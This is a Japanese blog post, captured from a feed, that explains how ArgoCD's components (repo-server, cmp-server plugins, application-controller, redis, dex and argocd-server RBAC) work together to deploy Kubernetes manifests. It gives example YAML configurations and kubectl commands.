みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能します。現在、複数のレイヤーの責務を持っており、将来的にUIとアプリケーションは異なるコンポーネントに分割されるかもしれません。  application-controller               コアドメイン          Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。                                                                                            repo-server                          コアドメイン          マニフェスト/チャートリポジトリからクローンを取得します。また、クローンからマニフェストを作成します。                                                                                                        redis-server                         インフラ              application-controllerの処理結果のキャッシュを保管します。                                                                                                                                                       dex-server                           インフラ              SSOを採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダーに送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。                                 GitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。仕組みそれでは、ArgoCDは、どのようにコンポーネントを組み合わせて、マニフェストをデプロイするのでしょうか。ここではプロダクト用Cluster管理者 (デプロイ先となるClusterを管理するエンジニア) は、ArgoCDのダッシュボードを介してマニフェストをデプロイするとしましょう。まずは、概要を説明していきます。(1) repo-serverによるクローン取得ArgoCDのCluster上で、repo-serverがマニフェスト/チャートリポジトリのクローンを取得します。(2) application-controllerによるマニフェスト取得application-controllerは、repo-serverからマニフェストを取得します。(3) application-controllerによるCluster確認application-controllerは、プロダクト用Clusterの現状を確認します。(4) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(5) argocd-serverによるキャッシュ取得argocd-serverは、redis-serverからキャッシュを取得します。(6) 管理者のログインプロダクト用Cluster管理者は、argocd-serverにログインしようとします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。▶ argocd-serverのログイン手法について(8) dex-serverによる認証リクエスト送信dex-serverは、IDプロバイダーに認可リクエストを作成し、これをIDプロバイダーに送信します。(9) argocd-serverによる認可フェーズ実行argocd-serverで認可フェーズを実施します。ログインが完了し、プロダクト用Cluster管理者は認可スコープに応じてダッシュボードを操作できます。▶ ArgoCDをどのClusterで管理するかについて(10) application-controllerによるマニフェストデプロイapplication-controllerは、Clusterにマニフェストをデプロイします。マニフェストのデプロイの仕組みをざっくり紹介しました。ただこれだと全く面白くないため、各コンポーネントの具体的な処理と、各々がどのように通信しているのかを説明します✌️03. repo-serverrepo-serverとはまずは、コアドメインレイヤーにあるrepo-serverです。マニフェスト/チャートリポジトリ (例：GiHub、GitHub Pages、Artifact Hub、AWS ECR、Artifact Registry、など) からクローンを取得します。repo-serverを持つPodには、他に軽量コンテナイメージからなるInitContainerとサイドカー (cmp-server) がおり、それぞれ機能が切り分けられています\uD83D\uDC4D仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピーrepo-serverの起動時に、InitContainerでお好きなマニフェスト管理ツール (Helm、Kustomize、など) やプラグイン (helm-secrets、KSOPS、SOPS、argocd-vault-plugin、など) をインストールします。また、サイドカーのcmp-serverでは起動時に/var/run/argocd/argocd-cmp-serverコマンドを実行する必要があり、InitContainer (ここではcopyutilコンテナ) を使用して、ArgoCDのコンテナイメージからargocd-cliのバイナリファイルをコピーします。repo-serverのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、ArgoCDで使いたいツール (Helm、SOPS、helm-secrets) をInitContainerでインストールしています。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: argocdspec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  initContainers:    # HelmをインストールするInitContainer    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # SOPSをインストールするInitContainer    - name: sops-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # helm-secretsをインストールするInitContainer    - name: helm-secrets-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /helm-working-dir/plugins          name: helm-working-dir    ...    # cmp-serverにargocd-cliのバイナリをコピーするInitContainer    - name: copyutil      image: quay.io/argoproj/argocd:latest      command:        - cp        - -n        - /usr/local/bin/argocd        - /var/run/argocd/argocd-cmp-server      volumeMounts:        - name: var-files          mountPath: /var/run/argocd  # Podの共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}    - name: var-files      emptyDir: {}Custom Tooling - Argo CD - Declarative GitOps CD for Kubernetes▶ ArgoCDのコンテナイメージに組み込まれているツールについてquay.io/argoproj/argocd) には、いくつかのツール (例：Helm、Kustomize、Ks、Jsonnet、など) の推奨バージョンがあらかじめインストールされています。そのため、これらのツールのプラグイン (例：helm-secrets) を使用する場合、上記のコンテナイメージからなるrepo-server内のツールをcmp-serverにコピーすればよいのでは、と思った方がいるかもしれません。この方法は全く問題なく、cmp-serverの/usr/local/binディレクトリ配下にツールをコピーするように、InitContainerを定義してもよいです。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest      volumeMounts:        - mountPath: /usr/local/bin/helm          # Podの共有ボリュームを介して、repo-serverでHelmを使用する。          name: custom-tools  initContainers:    - name: copy-helm      image: quay.io/argoproj/argocd:latest      # InitContainer上のHelmをVolumeにコピーする      command:        - /bin/cp        - -n        - /usr/local/bin/helm        - /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  # 共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}反対に、これらツールをInitContainerでインストールし直す場合は、ArgoCD上での推奨バージョンをちゃんとインストールするようにしましょう\uD83D\uDC4D2.6系では、ArgoCDのリポジトリ内のtool-versions.shファイルに、Helmのバージョンが定義されています。spec:  ...  initContainers:    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      # ArgoCDのリポジトリ上のtool-versions.shファイルから、Helmのバージョンを取得する      args:        - |          apk --update add curl wget          ARGOCD_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-helm/argo-cd-<ArgoCDのバージョン>/charts/argo-cd/Chart.yaml | grep appVersion | sed -e \'s/^[^: ]*: //\')          HELM_RECOMMENDED_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-cd/\\"${ARGOCD_VERSION}\\"/hack/tool-versions.sh | grep helm3_version | sed -e \'s/^[^=]*=//\')          wget -q https://get.helm.sh/helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          tar -xvf helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          cp ./linux-amd64/helm /custom-tools/          chmod +x /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  ...argo-cd/hack/tool-versions.sh at v2.6.0 \xb7 argoproj/argo-cd \xb7 GitHub(2) repo-serverによる認証情報取得repo-serverは、Secret (argocd-repo-creds) からリポジトリの認証情報を取得します。argocd-repo-credsではリポジトリの認証情報のテンプレートを管理しています。指定した文字列から始まる (最長一致) URLを持つリポジトリに接続する場合、それらの接続で認証情報を一括して適用できます。argocd-repo-credsのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、リポジトリのSSH公開鍵認証を採用し、argocd-repo-credsに共通の秘密鍵を設定しています。apiVersion: v1kind: Secretmetadata:  name: argocd-repo-creds-github  namespace: argocd  labels:    argocd.argoproj.io/secret-type: repo-credstype: Opaquedata:  type: git  url: https://github.com/hiroki-hasegawa  # 秘密鍵  sshPrivateKey: |    MIIC2 ...あとは、各リポジトリのSecret (argocd-repo) にURLを設定しておきます。すると、先ほどのargocd-repo-credsのURLに最長一致するURLを持つSecretには、一括して秘密鍵が適用されます。# foo-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: argocd  name: foo-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: bar-repository  # https://github.com/hiroki-hasegawa に最長一致する。  url: https://github.com/hiroki-hasegawa/bar-chart.git---# baz-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: foo  name: baz-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: baz-repository  # https://github.com/hiroki-hasegawa に最長一致する。  url: https://github.com/hiroki-hasegawa/baz-chart.gitDeclarative Setup - Argo CD - Declarative GitOps CD for Kubernetes(3) repo-serverのよるクローン取得とポーリングrepo-serverは、認証情報を使用して、リポジトリにgit cloneコマンドを実行します。取得したクローンを、/tmp/_argocd-repoディレクトリ配下にUUIDの名前で保管します。また、リポジトリの変更をポーリングし、変更を検知した場合はgit fetchコマンドを実行します。# クローンが保管されていることを確認できる$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/_argocd-repo/<URLに基づくUUID>\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yamlcustom repo-server - where is the local cache kept? \xb7 argoproj/argo-cd \xb7 Discussion #9889 \xb7 GitHub▶ repo-serverでのクローン保管先のバージョン差異について2.3以前では、repo-serverは/tmpディレクトリ配下にURLに基づく名前でクローンを保管します。$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/https___github.com_hiroki-hasegawa_foo-repository\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yaml(4) repo-serverによるサイドカーコールrepo-serverは、自身にマウントされたいくつかのマニフェスト管理ツール (例：Helm、Kustomize) を実行する機能を持っています。しかし、実行できないツールではサイドカー (cmp-server) をコールします。この時、Applicationのspec.source.pluginキーでプラグイン名を指定すると、そのApplicationではサイドカーをコールします。逆を言えば、プラグイン名を指定していないApplicationは、サイドカーをコールしない です。apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: foo-application  namespace: foospec:  source:    plugin:      name: helm-secrets # このプラグイン名は、ConfigManagementPluginのmetadata.nameキーに設定したもの  ...このコールは、Volume上のUnixドメインソケットを経由します。Unixドメインソケットのエンドポイントの実体は.sockファイルです。$ kubectl exec -it argocd-repo-server -c foo-plugin-cmp-server\\\\    -- bash -c \\"ls /home/argocd/cmp-server/plugins/\\"foo-plugin.sock▶ UnixソケットドメインについてUnixソケットドメインは、同じOS上のファイルシステムを介して、データを直接的に送受信する仕組みです。Unixソケットドメインを使用すると、同じVolumeがマウントされたコンテナのプロセス間で、データを送受信できます\uD83D\uDC4DASCII.jp：Unixドメインソケット (1/2)(5) repo-serverによる暗号化キーと暗号化変数の取得cmp-serverは、暗号化キー (例：AWS KMS、Google CKM、など) を使用してSecretストア (例：AWS SecretManager、Google SecretManager、SOPS、Vault、など) の暗号化変数を復号化します。▶ クラウドプロバイダーの暗号化キーを使用するために必要な証明書についてクラウドプロバイダーにある場合、クラウドプロバイダーがHTTPSプロトコルの使用を求める場合があります。cmp-serverに軽量なコンテナイメージを使用していると、/etc/sslディレクトリ (ディレクトリはOSによって異なる) に証明書が無く、cmp-serverがHTTPSプロトコルを使用できない可能性があります。その場合は、お好きな方法で証明書をインストールし、コンテナにマウントするようにしてください\uD83D\uDC4DapiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  ...    # サイドカーのcmp-server    - name: helm-secrets-cmp-server      image: ubuntu:latest      ...      volumeMounts:        # サイドカーがAWS KMSを使用する時にHTTPSリクエストを送信する必要があるため、証明書をマウントする        - name: certificate          mountPath: /etc/ssl  ...  initContainers:    - name: certificate-installer      image: ubuntu:latest      command:        - /bin/sh        - -c      args:        - |          apt-get update -y          # ルート証明書をインストールする          apt-get install -y ca-certificates          # 証明書を更新する          update-ca-certificates      volumeMounts:        - mountPath: /etc/ssl          name: certificate  volumes:    - name: certificate      emptyDir: {}(6) サイドカーによるプラグイン処理の取得cmp-serverは、マニフェスト管理ツールのプラグイン (helm-secrets、argocd-vault-plugin、など) を実行します。この時マニフェストの作成時のプラグインとして、ConfigMap配下のConfigManagementPluginでプラグインの処理を定義します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、プラグインとしてhelm-secretsを採用し、helm secrets templateコマンドの実行を定義します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmp-cm  namespace: foodata:  helm-secrets-plugin.yaml: |    apiVersion: argoproj.io/v1alpha1    kind: ConfigManagementPlugin    metadata:      namespace: foo      name: helm-secrets # このプラグイン名は、Applicationのspec.source.pluginキーで指定したもの    spec:      generate:        command:          - /bin/bash          - -c        args:          - |            set -o pipefail            helm secrets template -f $ARGOCD_ENV_SECRETS -f $ARGOCD_ENV_VALUES -n $ARGOCD_APP_NAMESPACE $ARGOCD_APP_NAME .  foo-plugin.yaml: |    ...▶ ConfigManagementPluginのファイル名についてプラグインごとにConfigManagementPluginのマニフェストを定義できるように、各ConfigManagementPluginを異なるファイル名とし、ConfigMapで管理するとよいです\uD83D\uDC4D(7) サイドカーによるプラグイン処理の実行cmp-serverはプラグインを実行し、Secretを含むマニフェストを作成します。ConfigMap配下のファイルをplugin.yamlの名前でサイドカーにマウントする必要があります。また、先ほどのUnixドメインソケットの.sockファイルや、 cmp-serverがプラグインを実行するための各バイナリファイルもマウントが必要です。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、helm-secretsプラグインを実行するサイドカー (helm-secrets-cmp-server) を作成します。apiVersion: v1kind: Podmetadata:  name: argocd-repo-serverspec:  containers:    # repo-server    - name: repo-server      image: quay.io/argoproj/argocd:latest    ...    # helm-secretsのcmp-server    - name: helm-secrets-cmp-server      # コンテナイメージは軽量にする      image: ubuntu:latest      command:        - /var/run/argocd/argocd-cmp-server      env:        # helmプラグインの場所を設定する        - name: HELM_PLUGINS          value: /helm-working-dir/plugins      securityContext:        runAsNonRoot: true        runAsUser: 999      volumeMounts:        # リポジトリのクローンをコンテナにマウントする        - name: tmp          mountPath: /tmp        # ConfigManagementPluginのマニフェスト (helm-secrets.yaml) を \\"plugin.yaml\\" の名前でコンテナにマウントする        - name: argocd-cmp-cm          mountPath: /home/argocd/cmp-server/config/plugin.yaml          subPath: helm-secrets.yaml        # コンテナ間で通信するためのUnixドメインソケットファイルをコンテナにマウントする        - name: plugins          mountPath: /home/argocd/cmp-server/plugins        # 任意のツールのバイナリファイルをコンテナにマウントする        - name: custom-tools          mountPath: /usr/local/bin        # helmプラグインのバイナリをコンテナにマウントする        - name: helm-working-dir          mountPath: /helm-working-dir/plugins      ...  # Podの共有ボリューム  volumes:    # リポジトリのクローンを含む    - name: tmp      emptyDir: {}    # Helmなどの任意のツールを含む    - name: custom-tools      emptyDir: {}    # helmプラグインを含む    - name: helm-working-dir      emptyDir: {}▶ マウント時のConfigManagementPluginのファイル名についてv2.6では、ConfigManagementPluginのマニフェストを/home/argocd/cmp-server/configディレクトリに、plugin.yamlの名前でマウントしないといけません。これは、cmp-serverの起動コマンド (/var/run/argocd/argocd-cmp-server) がplugin.yamlの名前しか扱えないためです。ArgoCD公式の見解で、サイドカーでは単一のプラグインしか実行できないように設計しているとのコメントがありました。今後のアップグレードで改善される可能性がありますが、v2.6では、ConfigManagementPluginの数だけcmp-serverが必要になってしまいます\uD83D\uDE47\uD83C\uDFFB‍use multiple plugins in sidecar installation method \xb7 argoproj/argo-cd \xb7 Discussion #12278 \xb7 GitHub▶ Kustomizeのプラグインをどのコンテナで実行するかについてプラグイン (例：KSOPS) によるマニフェスト作成は、サイドカーではなくrepo-serverで実行した方がよいかもしれません (Helmプラグインはサイドカーで問題ないです)。執筆時点 (2023/05/02) では、ArgoCDとKustomizeが密に結合しています。例えば、ArgoCD上のKustomize系オプションはrepo-serverでマニフェストを作成することを想定して設計されています。無理やりサイドカーでKustomizeのプラグインを実行しようとすると、ArgoCDの既存のオプションを無視した実装になってしまうため、Kustomizeのプラグインだけはrepo-serverで実行することをお勧めします\uD83D\uDE22▶ クラウドプロバイダーのSecretストアを採用する場合についてクラウドプロバイダーのSecretストア (例：AWS SecretManager、Google SecretManager、など) の変数を使用する場合は、Secretのデータ注入ツールのプラグイン (特にargocd-vault-plugin) を採用しなくてもよいです。この場合、代わりにSecretsストアCSIドライバーやExternalSecretsOperatorを使用できます。これらは、クラウドプロバイダーから変数を取得し、これをSecretにデータとして注入してくれます\uD83D\uDE47\uD83C\uDFFB‍How to manage Kubernetes secrets with GitOps? | Akuity04. application-controller、redis-serverapplication-controllerとはコアドメインレイヤーにあるapplication-controllerです。Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。redis-serverとはインフラレイヤーにあるredis-serverです。application-controllerの処理結果のキャッシュを保管します。仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンドArgoCD用Clusterの管理者は、ClusterにArgoCD系のカスタムリソース (例：Application、AppProject、など)　をデプロイします。▶ ArgoCD自体のデプロイにargo-helmを採用する場合についてマニフェストを作成できます。️GitHub - argoproj/argo-helm: ArgoProj Helm ChartsただしHelmの重要な仕様として、チャートの更新時に使用するhelm upgradeコマンドは、CRDを作成できる一方でこれを変更できません。HelmでCRDを作成するとHelmの管理ラベルが挿入されてしまうため、作成の時点からCRDがHelmの管理外となるように、kubectlコマンドでCRDを作成した方がよいです\uD83D\uDC4D$ kubectl diff -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"$ kubectl apply -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"ArgoCD上でHelmを使用してデプロイする場合はこの仕様を気にしなくてよいのかな、と思った方がいるかもしれないです。ですが本記事で解説した通り、ArgoCDはcmp-serverのhelm templateコマンド (この時、--include-crdsオプションが有効になっている) や、application-controllerのkubectl applyコマンドを組み合わせてマニフェストをデプロイしているため、CRDもちゃんと更新してくれます\uD83D\uDC4D\uD83C\uDFFB️Helm | Custom Resource Definitions(2) application-controllerによるArgoCD系カスタムリソースのReconciliationkube-controller-managerは、application-controllerを操作し、Reconciliationを実施します。application-controllerは、Etcd上に永続化されたマニフェストと同じ状態のArgoCD系カスタムリソースを作成/変更します。▶ カスタムコントローラーでもあるapplication-controllerについてHow Operators work in Kubernetes | Red Hat Developer(3) application-controllerによるマニフェスト取得application-controllerは、repo-serverからリポジトリのマニフェストを取得します。取得したマニフェストは、repo-serverのサイドカーであるcmp-serverが作成したものです。(4) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。application-controllerには、gitops-engineパッケージが内蔵されており、これはヘルスチェックからデプロイまでの基本的な処理を実行します。▶ gitops-engineパッケージについてディレクトリからなります\uD83D\uDC47\uD83D\uDC31 gitops-engine/├── \uD83D\uDCC2 pkg│    ├── cache│    ├── diff   # リポジトリとClusterの間のマニフェストの差分を検出する。ArgoCDのDiff機能に相当する。│    ├── engine # 他のパッケージを使い、GitOpsの一連の処理を実行する。│    ├── health # Clusterのステータスをチェックする。ArgoCDのヘルスチェック機能に相当する。│    ├── sync   # Clusterにマニフェストをデプロイする。ArgoCDのSync機能に相当する。│    └── utils  # 他のパッケージに汎用的な関数を提供する。│...マイクロサービスアーキテクチャはgitops-engine/specs/design-top-down.md at v0.7.0 \xb7 argoproj/gitops-engine \xb7 GitHub(5) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、repo-serverから取得したマニフェストの差分を検出します。ここで、kubectl diffコマンドの実行が自動化されています。(6) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。redis-serverは、Applicationやリポジトリのコミットの単位で、application-controllerの処理結果を保管しています。$ kubectl exec -it argocd-redis-server \\\\    -n foo \\\\    -- sh -c \\"redis-cli --raw\\"127.0.0.1:6379> keys *...app|resources-tree|<Application名>|<キャッシュバージョン>cluster|info|<プロダクト用ClusterのURL>|<キャッシュバージョン>git-refs|<マニフェスト/チャートリポジトリのURL>|<キャッシュバージョン>mfst|app.kubernetes.io/instance|<Application名>|<最新のコミットハッシュ値>|<デプロイ先Namespace>|*****|<キャッシュバージョン>...(7) application-controllerによるマニフェストデプロイapplication-controllerは、Applicationの操作に応じて、Clusterにマニフェストをデプロイします。ここで、kubectl applyコマンドの実行が自動化されています。▶ application-controllerがマニフェストを操作した証拠についてKubernetesリソースのマニフェストには、metadata.managedFieldsキーがあり、何がそのマニフェストを作成/変更したのかを確認できます。実際にマニフェストを確認してみると、確かにapplication-controllerがマニフェストを作成/変更してくれたことを確認できます。apiVersion: apps/v1kind: Deploymentmetadata:  managedFields:    # ArgoCDのapplication-controllerによる管理    - manager: argocd-application-controller      apiVersion: apps/v1      # kube-apiserverに対するリクエスト内容      operation: Update      time: \\"2022-01-01T16:00:00.000Z\\"      # ArgoCDのapplication-controllerが管理するマニフェストのキー部分      fields: ...️Server-Side Apply | Kubernetes05. dex-serverdex-serverとはインフラレイヤーにあるdex-serverです。SSO (例：OAuth 2.0、SAML、OIDC) を採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダー (例：GitHub、Keycloak、AWS Cognito、Google Auth、など) に送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。GitHub - dexidp/dex: OpenID Connect (OIDC) identity and OAuth 2.0 provider with pluggable connectors▶ dex-serverの必要性についてエストを直接的に送信することもできます。執筆時点 (2023/05/02) で、argocd-serverは特にOIDCの認可リクエストを作成できるため、ログイン要件がOIDCの場合は、dex-serverを必ずしも採用してなくもよいです。言い換えれば、その他のSSO (例：OAuth 2.0、SAML) を使用する場合は、dex-serverを採用する必要があります\uD83D\uDC4D️Overview - Argo CD - Declarative GitOps CD for Kubernetes仕組み(1) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(2) IDプロバイダーへの認証フェーズ委譲argocd-serverは、認証フェーズをIDプロバイダーに委譲するために、dex-serverをコールします。▶ 認証フェーズの委譲についてAuthentication and Authorization - Argo CD - Declarative GitOps CD for Kubernetes(3) dex-serverによる認可リクエスト作成dex-serverは、認可リクエストを作成します。認可リクエストに必要な情報は、ConfigMap (argocd-cm) で設定しておく必要があります。argocd-cmのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、IDプロバイダーをGitHubとし、認可リクエストに必要なクライアントIDとクライアントシークレットを設定しています。apiVersion: v1kind: ConfigMapmetadata:  namespace: foo  name: argocd-cmdata:  dex.config: |    connectors:      - type: github        id: github        name: GitHub SSO        config:          clientID: *****          clientSecret: *****        # dex-serverが認可レスポンスを受信するURLを設定する        redirectURI: https://example.com/api/dex/callback▶ dex-serverの設定についてdex.configキー配下の設定方法は、dexのドキュメントをみるとよいです\uD83D\uDC4DDex(4) dex-serverによる認可リクエスト送信dex-serverは、前の手順で作成した認可リクエストをIDプロバイダーに送信します。(5) IDプロバイダーによる認証フェーズ実施IDプロバイダー側でSSOの認証フェーズを実施します。IDプロバイダーは、コールバックURL (<ArgoCDのドメイン名>/api/dex/callback) を指定して、認可レスポンスを送信します。認可レスポンスは、argocd-serverを介して、dex-serverに届きます。▶ dex-serverのコールバックURLについてGitHubをIDプロバイダーとする場合、 Developer settingsタブ でSSOを設定する必要があり、この時にAuthorization callback URLという設定箇所があるはずです\uD83D\uDC4D\uD83C\uDFFB(6) argocd-serverによる認可フェーズ実施argocd-serverは、AuthZで認可フェーズを実施します。ConfigMap (argocd-rbac-cm) を参照し、IDプロバイダーから取得したユーザーやグループに、ArgoCD系カスタムリソースに関する認可スコープを付与します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、developerロールにはdevというAppProjectに属するArgoCD系カスタムリソースにのみ、またmaintainerロールには全てのAppProjectの操作を許可しています。またこれらのロールを、IDプロバイダーで認証されたグループに紐づけています。特定のArgoCD系カスタムリソースのみへのアクセスを許可すれば、結果として特定のClusterへのデプロイのみを許可したことになります\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  policy.default: role:developer  policy.csv: |    p, role:developer, *, *, dev/*/*, allow    p, role:maintainer, *, *, dev/*/*, allow    p, role:maintainer, *, *, prd/*/*, allow    g, developers, role:developer    g, maintainers, role:maintainer  scopes: \\"[groups]\\"▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetes06. argocd-server (argocd-apiserver)argocd-serverとは最後に、インフラレイヤーにあるargocd-serverです。『argocd-apiserver』とも呼ばれます。みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能し、他のコンポーネントと通信します\uD83E\uDD84仕組み(1) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。(2) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、ポーリング対象のリポジトリのマニフェストの差分を検出します。(3) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(4) application-controllerによる処理結果取得argocd-serverは、redis-serverから処理結果を取得します。(5) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(6) IngressコントローラーによるルーティングIngressコントローラーは、Ingressのルーティングルールを参照し、argocd-serverにルーティングします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。(8) IDプロバイダーによる認証フェーズ実施IDプロバイダー上で認証フェーズが完了します。argocd-serverは、ConfigMap (argocd-rbac-cm) を参照し、プロダクト用Cluster管理者に認可スコープを付与します。(9) argocd-serverによる認可フェーズ実施argocd-serverは、認可スコープに応じて、プロダクト用Cluster管理者がApplicationを操作可能にします。▶ NamespacedスコープモードについてapiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:  # 設定してはダメ  # application.namespaces: \\"*\\" # 全てのNamespaceを許可する。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: dev-foo-project  namespace: foospec:  # 設定してはダメ  # sourceNamespaces:  #  - \\"foo\\"これらにより、fooのNamespaceに属するArgoCDは、他のNamespaceにはアクセスできなくなります\uD83D\uDC4DInstallation - Argo CD - Declarative GitOps CD for Kubernetes(10) application-controllerによるマニフェストデプロイプロダクト用Cluster管理者は、ダッシュボード (argocd-server) を使用して、ClusterにマニフェストをSyncします。この時、Applicationを介してapplication-controllerを操作し、マニフェストをデプロイします。図では、App-Of-Appsパターンを採用したと仮定しています\uD83D\uDC68‍\uD83D\uDC69‍\uD83D\uDC67‍\uD83D\uDC66▶ App-Of-Appsパターンについてデザインパターンがあります。これは、Applicationを階層的に作成するパターンであり、最下層のApplication配下のマニフェストをより疎結合に管理できます✌️例えば以下の画像の通り、最上位のApplication配下に、チーム別の親Applicationを配置します (アプリチームの親Application、インフラチームのそれ) 。その後、両方のApplication配下にさらにチャート別に最下層の子Applicationを配置し、チャートのデプロイを管理します。アプリチーム最下層の子Applicationではアプリコンテナのチャート、インフラチームの子Applicationでは監視/ネットワーク/ハードウェアリソース管理系のチャートを管理します\uD83D\uDC4D07. アーキテクチャのまとめ今までの全ての情報をざっくり整理して簡略化すると、ArgoCDは以下の仕組みでマニフェストをデプロイすることになります\uD83D\uDC4708. おわりにArgoCDによるデプロイの仕組みの仕組みをもりもり布教しました。ArgoCDは、UIが使いやすく、仕組みの詳細を知らずとも比較的簡単に運用できるため、ユーザーフレンドリーなツールだと思っています。もしArgoCDを使わずにマニフェストをデプロイしている方は、ArgoCDの採用をハイパー・ウルトラ・アルティメットおすすめします\uD83D\uDC4D謝辞ArgoCDの設計にあたり、以下の方に有益なプラクティスをご教授いただきました。@yaml_villager さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/05/02/145115","isoDate":"2023-05-02T05:42:57.000Z","dateMiliSeconds":1683006177000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"現代のクエリオプティマイザの基礎となる技術をまとめた論文を読みました","contentSnippet":"この記事の趣旨1998年に発表されたクエリオプティマイザの基礎としてとくに重要な手法をまとめた論文を読みました。An Overview of Query Optimization in Relational Systems著者についてSurajit 